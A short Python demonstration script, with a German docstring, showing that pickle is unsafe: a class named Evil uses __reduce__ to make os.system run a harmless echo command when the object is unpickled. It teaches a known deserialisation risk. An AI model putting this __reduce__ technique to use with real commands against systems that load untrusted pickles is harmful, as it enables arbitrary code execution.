"""PIckle ist potentiell unsicher, da der enthaltene Code
direkt ausgeführt werden kann."""

import pickle
from pathlib import Path
import os


class Evil:
    def __reduce__(self):
        return (os.system, ("echo YOU HAVE BEEN HACKED!",))


malicous = pickle.dumps(Evil())
unsafe = pickle.loads(malicous)
